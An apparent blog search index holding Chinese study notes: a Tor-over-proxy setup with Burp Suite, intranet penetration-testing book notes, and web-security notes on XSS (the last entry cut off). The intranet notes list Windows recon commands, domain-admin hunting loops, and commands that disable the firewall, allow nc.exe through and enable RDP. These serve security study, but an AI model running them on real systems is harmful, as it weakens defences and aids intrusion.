<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Tor over vpn, Burp Suite and Firefox</title>
    <link href="/2021/02/21/tor/"/>
    <url>/2021/02/21/tor/</url>
    
    <content type="html"><![CDATA[<h1 id="Tor-over-vpn-Burp-Suite-and-Firefox"><a href="#Tor-over-vpn-Burp-Suite-and-Firefox" class="headerlink" title="Tor over vpn, Burp Suite and Firefox"></a>Tor over vpn, Burp Suite and Firefox</h1><h2 id="一-简要介绍"><a href="#一-简要介绍" class="headerlink" title="一    简要介绍"></a>一    简要介绍</h2><p>在kali虚拟机下，先连接vpn到国外结点，然后通过vpn连接Tor，最后再用Burp Suite和Firefox进行抓包</p><h2 id="二-准备工作"><a href="#二-准备工作" class="headerlink" title="二    准备工作"></a>二    准备工作</h2><p>主机挂不挂vpn无所谓，使用vmware准备一个kali虚拟机，网络适配器选择NAT模式，其他的都常规安装就行，以及vpn</p><h2 id="三-具体步骤"><a href="#三-具体步骤" class="headerlink" title="三    具体步骤"></a>三    具体步骤</h2><h3 id="1-配置使用v2ray"><a href="#1-配置使用v2ray" class="headerlink" title="1    配置使用v2ray"></a>1    配置使用v2ray</h3><p>1    准备文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># v2ray</span><br><span class="hljs-attribute">wget</span> https://github.com/v<span class="hljs-number">2</span>ray/v<span class="hljs-number">2</span>ray-core/releases/download/v<span class="hljs-number">4</span>.<span class="hljs-number">27</span>.<span class="hljs-number">0</span>/v<span class="hljs-number">2</span>ray-linux-<span class="hljs-number">64</span>.zip <br><br><span class="hljs-comment"># Qv2ray</span><br><span class="hljs-attribute">wget</span> https://github.com/Qv<span class="hljs-number">2</span>ray/Qv<span class="hljs-number">2</span>ray/releases/download/v<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>/Qv<span class="hljs-number">2</span>ray.v<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>.linux-x<span class="hljs-number">64</span>.AppImage<br></code></pre></td></tr></table></figure><p>2    解压</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unzip</span> v<span class="hljs-number">2</span>ray-linux-<span class="hljs-number">64</span>.zip<br></code></pre></td></tr></table></figure><p>3    运行</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">chmod</span> +<span class="hljs-selector-tag">x</span> <span class="hljs-selector-tag">Qv2ray</span><span class="hljs-selector-class">.v2</span>.6.3<span class="hljs-selector-class">.linux-x64</span><span class="hljs-selector-class">.AppImage</span><br><br>./<span class="hljs-selector-tag">Qv2ray</span><span class="hljs-selector-class">.v2</span>.6.3<span class="hljs-selector-class">.linux-x64</span><span class="hljs-selector-class">.AppImage</span><br></code></pre></td></tr></table></figure><p>4    运行后如下</p><p><a href="https://imgchr.com/i/yTutXQ"><img src="https://s3.ax1x.com/2021/02/21/yTutXQ.jpg" alt="yTutXQ.jpg" style="zoom: 80%;" /></a></p><p>5    选择左上角preference -&gt; General Settings，可以更改语言为中文</p><p><a href="https://imgchr.com/i/yTuUmj"><img src="https://s3.ax1x.com/2021/02/21/yTuUmj.jpg" alt="yTuUmj.jpg" style="zoom:80%;" /></a></p><p>6    然后选择内核设置，将 V2Ray核心可执行文件路径 和 V2Ray资源目录 修改为 v2ray-linux-64.zip解压后文件夹中的可执行文件路径 及 所在目录（图中已对文件夹名进行修改）</p><p><a href="https://imgchr.com/i/yTuY6g"><img src="https://s3.ax1x.com/2021/02/21/yTuY6g.jpg" alt="yTuY6g.jpg" style="zoom:80%;" /></a></p><p>7    选择入站设置，调整为图中所示，记住端口号，例如8889，可以根据需求修改连接设置中的选项，其余设置不变</p><p><a href="https://imgchr.com/i/yTKKvF"><img src="https://s3.ax1x.com/2021/02/21/yTKKvF.jpg" alt="yTKKvF.jpg" style="zoom:80%;" /></a></p><p>8    返回主页面，选择分组，使用Default Group 或 创建新分组，勾选此分组是一个订阅，填入订阅地址，点击OK</p><p><a href="https://imgchr.com/i/yTK0DH"><img src="https://s3.ax1x.com/2021/02/21/yTK0DH.jpg" alt="yTK0DH.jpg" style="zoom:80%;" /></a></p><p>9    返回主页面，右键分组，点击更新订阅，双击分组即可看到节点进行连接</p><h3 id="2-安装并使用Tor"><a href="#2-安装并使用Tor" class="headerlink" title="2    安装并使用Tor"></a>2    安装并使用Tor</h3><p>1    根据实际情况决定需不需要换源</p><p>2    执行命令安装tor</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bsh">apt-get update<br>apt-get dist-upgrade(可选)<br>apt-get install tor<br></code></pre></td></tr></table></figure><p>3    使用vim，leafpad，mousepad等修改配置文件 /etc/tor/torrc</p><p>此处使用leafpad打开文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo leafpad <span class="hljs-regexp">/etc/</span>tor/torrc<br></code></pre></td></tr></table></figure><p>在文件开头添加下句后保存（端口号是刚刚记下的）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><br><span class="hljs-attribute">HTTPSProxy</span> <span class="hljs-number">127.0.0.1:8889</span><br><br></code></pre></td></tr></table></figure><p>根据<a href="https://2019.www.torproject.org/docs/tor-manual.html.en">官方文档</a>的解释</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">HTTPSProxy host[:port]<br><br>Tor will <span class="hljs-keyword">make</span> <span class="hljs-keyword">all</span> its OR (SSL) connections through this hos<span class="hljs-variable">t:port</span> (<span class="hljs-built_in">or</span> hos<span class="hljs-variable">t:443</span> <span class="hljs-keyword">if</span> port <span class="hljs-keyword">is</span> not specified), via HTTP CONNECT rather than connecting directly <span class="hljs-keyword">to</span> servers. You may want <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> FascistFirewall <span class="hljs-keyword">to</span> restrict the <span class="hljs-keyword">set</span> of ports you might <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span>, <span class="hljs-keyword">if</span> your HTTPS proxy <span class="hljs-keyword">only</span> allows connecting <span class="hljs-keyword">to</span> certain ports.<br></code></pre></td></tr></table></figure><p>同样的，如果使用tor browser经过一次代理后连接tor，再翻看torrc也有一样的语句</p><p>其中tor默认端口为9050，如果需要修改，则更改</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SocksPort</span> <span class="hljs-number">9050</span><br></code></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/yT15lV"><img src="https://s3.ax1x.com/2021/02/21/yT15lV.jpg" alt="yT15lV.jpg"></a></p><p>4    启动tor</p><p>如图所示达到100%即成功启动</p><p><a href="https://imgchr.com/i/yTGGLT"><img src="https://s3.ax1x.com/2021/02/21/yTGGLT.jpg" alt="yTGGLT.jpg"></a></p><h3 id="3-配置Burp-Suite"><a href="#3-配置Burp-Suite" class="headerlink" title="3    配置Burp Suite"></a>3    配置Burp Suite</h3><p>只需要修改user options中的socks proxy为tor的host和port，其余设置不变</p><p><a href="https://imgchr.com/i/yTNKBV"><img src="https://s3.ax1x.com/2021/02/21/yTNKBV.jpg" alt="yTNKBV.jpg" style="zoom:80%;" /></a></p><h3 id="4-配置Firefox"><a href="#4-配置Firefox" class="headerlink" title="4    配置Firefox"></a>4    配置Firefox</h3><p>进行如图所示修改，其中HTTP Proxy的端口为Burp Suite中Proxy的默认端口8080，可以根据需要进行修改，导入Burp Suite证书不再赘述</p><p><a href="https://imgchr.com/i/yTNLD0"><img src="https://s3.ax1x.com/2021/02/21/yTNLD0.jpg" alt="yTNLD0.jpg" style="zoom:80%;" /></a></p><h3 id="5-检查ip和抓包测试"><a href="#5-检查ip和抓包测试" class="headerlink" title="5    检查ip和抓包测试"></a>5    检查ip和抓包测试</h3><p>1    访问whatismyipaddress.com，tor代理成功</p><p><a href="https://imgchr.com/i/yTUlrt"><img src="https://s3.ax1x.com/2021/02/21/yTUlrt.jpg" alt="yTUlrt.jpg" style="zoom:80%;" /></a></p><p>2    使用Burp Suite抓包，成功</p><p><a href="https://imgchr.com/i/yTUXQA"><img src="https://s3.ax1x.com/2021/02/21/yTUXQA.jpg" alt="yTUXQA.jpg"></a></p><h2 id="四-匿名性"><a href="#四-匿名性" class="headerlink" title="四    匿名性"></a>四    匿名性</h2><p>此处给出一个<a href="https://gitlab.torproject.org/legacy/trac/-/wikis/doc/TorPlusVPN">链接</a></p><h2 id="五-正确性"><a href="#五-正确性" class="headerlink" title="五    正确性"></a>五    正确性</h2><p>暂不保证hhhhhhhhhh</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《内网安全攻防》阅读笔记</title>
    <link href="/2020/11/08/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"/>
    <url>/2020/11/08/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="内网安全攻防"><a href="#内网安全攻防" class="headerlink" title="内网安全攻防"></a>内网安全攻防</h1><h2 id="内网渗透测试基础"><a href="#内网渗透测试基础" class="headerlink" title="内网渗透测试基础"></a>内网渗透测试基础</h2><h3 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h3><ul><li><p>工作组</p></li><li><p>域：有安全边界的计算机集合</p><ul><li>单域：至少两台域服务器，一台DC，一台备用DC</li><li>父子域：父子域的名字用一个“.”代表一个层次</li><li>域树：多个域通过建立信任关系的集合</li><li>域森林：多个域树通过建立信任关系的集合</li><li>域名服务器：用于实现域名和与之对应的IP地址转换的服务器</li></ul></li><li><p>域控制器（DC）</p></li><li><p>活动目录：域环境中提供目录服务的组件，用于存储有关网络对象的信息</p><ul><li>账号集中管理</li><li>软件集中管理</li><li>环境集中管理</li><li>增强安全性</li><li>更可靠，更短的宕机时间</li></ul></li><li><p>安全域的划分</p><ul><li><p>目的：将一组安全等级相同的计算机划入同一网段</p></li><li><p>安全级别最高的内网</p><ul><li>办公区</li><li>核心区</li></ul></li><li><p>安全等级中等的DMZ隔离区：解决安装防火墙后外部网络不能访问内部网络的问题</p><ul><li><p>位于企业内部网络和外部网络之间</p></li><li><p>放置一些必须公开的服务器设施，比如企业WEB服务器，FTP服务器和论坛服务器等</p></li><li><p>访问控制策略</p><ul><li>内网可以访问外网，防火墙需要执行NAT</li><li>内网可以访问DMZ</li><li>外网不能访问内网，防火墙基本策略，如果要访问就要通过VPN</li><li>外网可以访问DMZ，防火墙完成对外地址到服务器实际地址的转换</li><li>DMZ不能访问内网</li><li>DMZ不能访问外网，有例外，比如邮件服务器</li></ul></li></ul></li><li><p>安全等级最低的外网</p></li></ul></li><li><p>域中计算机分类</p><ul><li>域控制器</li><li>成员服务器</li><li>客户机</li><li>独立服务器：不加入域，也不安装活动目录</li></ul></li><li><p>域内权限解读</p><ul><li><p>域本地组：多域用户访问单域资源</p><ul><li>可以从任何域添加用户账户、通用组和全局组，但只能在其所在域内指派权限</li><li>域本地组不能嵌套于其他组中</li><li>主要是用于授予位于本域资源的访问权限</li><li>来自全林，作用于本域</li></ul></li><li><p>全局组：单域用户访问多域资源</p><ul><li>只能在创建该全剧组的域中添加用户和全剧组</li><li>可以嵌套在其他组中</li><li>来自本域，作用于全林</li></ul></li><li><p>通用组</p><ul><li>可以从任何域中添加用户和组</li><li>可以嵌套于其他域组中</li><li>保存在全局编录（GC）中</li><li>来自全林，作用全林</li></ul></li><li><p>A-G-DL-P策略：将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限</p></li></ul></li></ul><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul><li>我是谁：对当前机器角色进行判断</li><li>这是哪：对当前机器所处的网络环境的拓扑结构进行分析和判断</li><li>我在哪：对当前机器所处的区域的判断</li></ul><h3 id="收集本机信息"><a href="#收集本机信息" class="headerlink" title="收集本机信息"></a>收集本机信息</h3><ul><li><p>手动收集本机信息</p><ul><li><p>查询网络配置信息</p><ul><li>ipconfig /all</li></ul></li><li><p>查询操作系统及软件信息</p><ul><li>操作系统和版本信息：systeminfo | findstr /B /C:”OS Name” /C:”OS Version”</li><li>查看系统体系结构：echo %PROCESSOR_ARCHITECTURE%</li><li>查看安装的软件，版本，路径等：wmic product get name,version 或 powershell “Get-WmiObject” -class Win32_Product | Select-Object -Property name,version”</li></ul></li><li><p>查询本机服务信息</p><ul><li>wmic service list brief</li></ul></li><li><p>查询进程列表</p><ul><li>testlist 或 wmic process list brief</li></ul></li><li><p>查看启动程序信息</p><ul><li>wmic startup get command,caption</li></ul></li><li><p>查看计划任务</p><ul><li>schtasks /query /fo LIST /v</li></ul></li><li><p>查看主机开机时间</p><ul><li>net statistics workstation</li></ul></li><li><p>查看用户列表</p><ul><li>查看本机用户列表：net user</li><li>获取本地管理员信息：net localgroup administrators</li><li>查看当前在线用户：query user || qwinsta</li></ul></li><li><p>列出或断开本地计算机与所连接的客户端之间的会话</p><ul><li>net session</li></ul></li><li><p>查询端口列表</p><ul><li>netstat -ano</li></ul></li><li><p>查看补丁列表</p><ul><li>systeminfo 或 wmic qfe get Caption,Description,HotFixID,InstalledOn</li></ul></li><li><p>查询本机共享列表</p><ul><li>net share 或 wmic share get name,path,status</li></ul></li><li><p>查看路由表及所有可用接口的ARP缓存表</p><ul><li>route print 或 arp -a</li></ul></li><li><p>查询防火墙相关配置</p><ul><li><p>关闭防火墙</p><ul><li>windows server 2003 之前：netsh firewall set opmode disable</li><li>windows server 2003 之后：nersh advfirewall set allprofiles state off</li></ul></li><li><p>查看防火墙配置</p><ul><li>netsh firewall show config</li></ul></li><li><p>修改防火墙配置</p><ul><li><p>windows server 2003 之前，允许指定程序全部连接：netsh firewall add allowedprogram c:\nc.exe “allow nc” enable</p></li><li><p>windows server 2003 之后</p><ul><li>允许指定程序进入：nersh advfirewall firewall add rule name=”pass nc” dir=in action=allow program=”c:\nc.exe”</li><li>允许指定程序退出：nersh advfirewall firewall add rule name=”Allow nc” dir=out action=allow program=”c:\nc.exe”</li><li>允许3389端口放行：nersh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow</li></ul></li></ul></li><li><p>自定义防火墙日志的存储位置</p><ul><li>netsh advfirewall set currentprofile logging filename “C:\windows\temp\fw.log”</li></ul></li></ul></li><li><p>查询代理配置情况</p><ul><li>查看127.0.0.1的1080端口：reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings”</li></ul></li><li><p>查询并开启远程连接服务</p><ul><li><p>查看远程连接端口：REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp” /V PortNumber</p></li><li><p>在windows server 2003中开启3389端口：wmic path win32_terminalservicesetting where (__CLASS !=””)  call setallowtsconnections 1</p></li><li><p>在Windows Server 2008和Windows Server 2012中开启3389端口</p><ul><li>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=””) call setallowtsconnections 1</li><li>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=’RDP-Tcp’) call setuserauthenticationrequired 1</li><li>reg add “HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</li></ul></li></ul></li></ul></li><li><p>自动收集信息</p><ul><li>wmic_info.bat</li></ul></li><li><p>Empire下的主机信息收集</p></li></ul><h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><ul><li>查询当前权限：whoami</li><li>获取域SID：whoami /all</li><li>查询指定用户的详细信息：net user XXX /domain</li></ul><h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><ul><li><p>使用ipconfig命令</p><ul><li>执行 ipconfig /all ，可以查看网关IP地址，DNS的IP地址，域名，本机是否和DNS服务器是否处于同一网段等信息</li><li>然后反向解析查询命令nslookup来解析域名的IP地址</li></ul></li><li><p>查看系统详细信息</p><ul><li><p>systeminfo</p><ul><li>域即域名，登陆服务器即域控制器，如果域为WORKGROUP，表示当前服务器不在域内</li></ul></li></ul></li><li><p>查询当前登录域及登陆用户信息</p><ul><li>net config workstation</li></ul></li><li><p>判断主域</p><ul><li><p>net time /domain</p><ul><li>存在域，但当前用户不是域用户：发生系统错误5，拒绝访问</li><li>存在域，且当前用户是域用户：显示时间</li><li>不存在域：找不到…</li></ul></li></ul></li></ul><h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><ul><li><p>利用NetBIOS快速探测内网</p></li><li><p>利用ICMP协议快速探测内网</p><ul><li>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL=”</li></ul></li><li><p>利用ARP扫描探测内网</p><ul><li>arp-scan工具：目标机中运行arp.exe -t 192.168.1.0/20</li><li>Empire中的arpscan模块：usemodule situational_awareness/network/arpscan</li><li>Nishang中的Invoke-ARPScan.ps1脚本：目标机中运行或远程加载脚本 powershell.exe -exec bypass -Command “&amp;{Import-Module C:\windows\temp\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/20}” &gt;&gt; C:\windows\temp\log.txt</li></ul></li><li><p>通过常规UDP/TCP端口扫描内网</p><ul><li>ScanLine工具</li></ul></li></ul><h3 id="扫描域内端口"><a href="#扫描域内端口" class="headerlink" title="扫描域内端口"></a>扫描域内端口</h3><ul><li><p>利用telnet命令进行扫描</p><ul><li>telnet DC port</li></ul></li><li><p>S扫描器</p></li><li><p>Metasploit端口扫描</p></li><li><p>PowerSploit的Invoke-portscan.ps1脚本</p></li><li><p>Nishang的Invoke-PortScan模块</p></li></ul><h3 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title="收集域内基础信息"></a>收集域内基础信息</h3><ul><li><p>查询域</p><ul><li>net view /domain</li></ul></li><li><p>查询域内计算机</p><ul><li>net view /domain:HACKE</li></ul></li><li><p>查询域内所有用户列表</p><ul><li>net group /domain</li></ul></li><li><p>查询所有域成员计算机列表</p><ul><li>net group “domain computers” /domain</li></ul></li><li><p>获取域密码信息</p><ul><li>net accounts /domain</li></ul></li><li><p>获取域信任信息</p><ul><li>nltest /domain_trusts</li></ul></li></ul><h3 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h3><ul><li><p>查看域控制器的机器名</p><ul><li>nltest /DCLIST:hacke</li></ul></li><li><p>查看域控制器的主机名</p><ul><li>Nslookup -type=SRV _ldap._tcp</li></ul></li><li><p>查看当前时间</p><ul><li>net time /domain</li></ul></li><li><p>查看域控制器组</p><ul><li>net group “Domain Controllers” /domain</li><li>netdom query pdc</li></ul></li></ul><h3 id="获取域内的用户和管理员信息"><a href="#获取域内的用户和管理员信息" class="headerlink" title="获取域内的用户和管理员信息"></a>获取域内的用户和管理员信息</h3><ul><li><p>查询所有域用户列表</p><ul><li><p>向域控制器查询</p><ul><li>net user /domain</li></ul></li><li><p>获取域内用户的详细信息</p><ul><li>wmic useraccount get /all</li></ul></li><li><p>查看存在的用户</p><ul><li>dsquery user</li></ul></li><li><p>查询本地管理员组用户</p><ul><li>net localgroup administrators</li></ul></li></ul></li><li><p>查询域管理员用户组</p><ul><li><p>查询域管理员用户</p><ul><li>net group “domain admins” /domain</li></ul></li><li><p>查询管理员用户组</p><ul><li>net group “Enterprise Admins” /domain</li></ul></li></ul></li></ul><h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><ul><li><p>定位域管理员的常规渠道：1、日志；2、会话</p></li><li><p>常用域管理员定位工具</p><ul><li><p>psloggedon.exe</p><ul><li>可以查看本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。原理是检查注册表，某些功能需要管理员权限。</li></ul></li><li><p>PVEFindADUser.exe</p><ul><li>查找活动用户登陆的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户，通过RDP登录的用户，用于运行服务和计算任务的用户。需要.NET Framework 2.0环境，并且需要具有管理员权限。</li></ul></li><li><p>netview.exe</p><ul><li>枚举工具，使用WinAPI枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登录的用户，查询共享入口和有价值的用户。绝大部分功能不需要管理员权限。</li></ul></li><li><p>Nmap的NSE脚本</p><ul><li>如果存在域账户或者本地账户，就可以使用Nmap的smb-enum-sessions.nse引擎获取远程机器的登录会话。</li></ul></li><li><p>PowerView脚本</p><ul><li>Invoke-StealthUserHunter：只需要一次查询就可以获取域里面的所有用户。方法：从user.HomeDirectories中提取所有用户，并对每台服务器进行Get-NetSessions获取。隐蔽性较高，但不全面。</li><li>Invoke-UserHunter：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。使用Get-NetSessions和Get-NetLoggedon扫描每台服务器并对扫描结果进行比较。</li></ul></li><li><p>Empire的user_hunter模块</p><ul><li>查找域管理员登录的机器</li></ul></li></ul></li></ul><h3 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h3><ul><li><p>本机检查</p><ul><li><p>获取域管理员列表</p><ul><li>net group “domain admins” /domain</li></ul></li><li><p>列出本机的所有进程及进程用户</p><ul><li>tasklist /v</li></ul></li><li><p>寻找进程所有者为域管理员的进程</p></li></ul></li><li><p>查询域控制器的域用户会话</p><ul><li><p>查询域控制器列表</p><ul><li>net group “Domain Controllers” /domain</li></ul></li><li><p>收集域管理员列表</p><ul><li>net group “domain admins” /domain</li></ul></li><li><p>收集所有活动域的会话列表</p><ul><li>netsess.exe</li></ul></li><li><p>交叉引用域管理员列表与活动会话列表</p><ul><li>FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a </li></ul></li></ul></li><li><p>查询远程系统中运行的任务</p><ul><li><p>该脚本将目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到names.txt中</p><ul><li>FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</li></ul></li></ul></li><li><p>扫描远程系统的NetBIOS信息</p><ul><li><p>该脚本将目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到admins.txt中</p><ul><li>FOR /F %i in (ips.txt) DO @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</li></ul></li><li><p>该脚本将目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到admins.txt中，和nbtscan工具置于同一目录下</p><ul><li>FOR /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</li></ul></li></ul></li></ul><h3 id="利用PowerShell收集域信息"><a href="#利用PowerShell收集域信息" class="headerlink" title="利用PowerShell收集域信息"></a>利用PowerShell收集域信息</h3><ul><li><p>四种权限</p><ul><li>Restricted 默认设置，不允许执行任何脚本</li><li>Allsigned 只能运行经过证书验证的脚本</li><li>Unrestricted 权限最高，可以执行任意脚本</li><li>RemoteSigned 对本地脚本不进行限制，对来自网络的脚本必须验证其签名</li></ul></li><li><p>PowerView</p></li></ul><h3 id="域分析工具BloodHound"><a href="#域分析工具BloodHound" class="headerlink" title="域分析工具BloodHound"></a>域分析工具BloodHound</h3><h3 id="敏感信息防护"><a href="#敏感信息防护" class="headerlink" title="敏感信息防护"></a>敏感信息防护</h3><ul><li><p>资料，数据，文件的定位流程</p><ul><li>定位内部人事组织结构</li><li>在内部人事组织结构中寻找需要监视的人员</li><li>定位相关人员的机器</li><li>监视相关人员存放文档的位置</li><li>列出存放文档的服务器的目录</li></ul></li><li><p>重点核心业务机器及敏感信息</p></li><li><p>应用与文件形式信息</p></li></ul><h3 id="分析域内网划分情况及拓扑结构"><a href="#分析域内网划分情况及拓扑结构" class="headerlink" title="分析域内网划分情况及拓扑结构"></a>分析域内网划分情况及拓扑结构</h3><ul><li><p>基本架构</p></li><li><p>域内网段划分</p><ul><li>DMZ：在外围Web环境中拿到的权限都在DMZ中</li><li>办公区</li><li>核心区</li></ul></li><li><p>多层域结构</p></li><li><p>绘制内网拓扑图</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《白帽子讲Web安全》阅读笔记</title>
    <link href="/2020/10/31/%E7%99%BD%E5%B8%BD%E5%AD%90/"/>
    <url>/2020/10/31/%E7%99%BD%E5%B8%BD%E5%AD%90/</url>
    
    <content type="html"><![CDATA[<h2 id="第一章-安全世界观"><a href="#第一章-安全世界观" class="headerlink" title="第一章 安全世界观"></a>第一章 安全世界观</h2><h3 id="1、安全问题的本质是信任的问题"><a href="#1、安全问题的本质是信任的问题" class="headerlink" title="1、安全问题的本质是信任的问题"></a>1、安全问题的本质是信任的问题</h3><h3 id="2、白帽子兵法："><a href="#2、白帽子兵法：" class="headerlink" title="2、白帽子兵法："></a>2、白帽子兵法：</h3><p><strong>1、Secure by Default 原则</strong>：更多地使用白名单</p><p><strong>2、Defense in Depth 纵深防御原则</strong>：不用层面不同方案，相互配合构成整体，正确地方做正确的事</p><p><strong>3、数据与代码分离原则</strong></p><p><strong>4、不可预测性原则</strong></p><h2 id="第二章-浏览器安全"><a href="#第二章-浏览器安全" class="headerlink" title="第二章 浏览器安全"></a>第二章 浏览器安全</h2><h3 id="1、同源策略"><a href="#1、同源策略" class="headerlink" title="1、同源策略"></a>1、同源策略</h3><p>浏览器的同源策略，限制了来自不同源的 “document” 或脚本，对当前的 “document” 读取或设置某些属性</p><h3 id="2、浏览器挂马和浏览器沙箱"><a href="#2、浏览器挂马和浏览器沙箱" class="headerlink" title="2、浏览器挂马和浏览器沙箱"></a>2、浏览器挂马和浏览器沙箱</h3><p>在网页中插入一段恶意代码，利用浏览器漏洞执行任意代码的攻击方式，称为“挂马”</p><p>Sandbox让不可信任的代码运行在一定的环境，限制不可信任的代码访问隔离区之外的资源</p><h3 id="3、恶意网址拦截"><a href="#3、恶意网址拦截" class="headerlink" title="3、恶意网址拦截"></a>3、恶意网址拦截</h3><p>基于黑名单</p><h3 id="4、其他"><a href="#4、其他" class="headerlink" title="4、其他"></a>4、其他</h3><p>1、微软IE8 XSS Filter的过滤规则</p><p>2、XSS攻击在没有第三方插件帮助的情况下，无法控制HTTP头，Firefox推出的CSP做法是由服务器端返回一个描述页面应该遵守的安全策略的HTTP头，只不过配置复杂，维护成本大</p><p>3、不同浏览器对于畸形浏览器的处理可能会被利用</p><p>4、浏览器插件也可以被利用</p><h2 id="第三章-XSS"><a href="#第三章-XSS" class="headerlink" title="第三章 XSS"></a>第三章 XSS</h2><h3 id="1、XSS-跨站脚本攻击"><a href="#1、XSS-跨站脚本攻击" class="headerlink" title="1、XSS 跨站脚本攻击"></a>1、XSS 跨站脚本攻击</h3><p>指通过”HTML注入“篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户的浏览器的一种攻击</p><h3 id="2、分类"><a href="#2、分类" class="headerlink" title="2、分类"></a>2、分类</h3><h4 id="1、反射型XSS"><a href="#1、反射型XSS" class="headerlink" title="1、反射型XSS"></a>1、反射型XSS</h4><p>简单地把用户输入的数据”反射“给浏览器，一般来说需要诱使用户”点击“一个恶意链接</p><h4 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h4><p>会把用户输入的数据”存储“在服务器端</p><h4 id="3、DOM-Based-XS"><a href="#3、DOM-Based-XS" class="headerlink" title="3、DOM Based XS"></a>3、DOM Based XS</h4><p>效果上来说也是反射型XSS</p><h3 id="4、一些作用"><a href="#4、一些作用" class="headerlink" 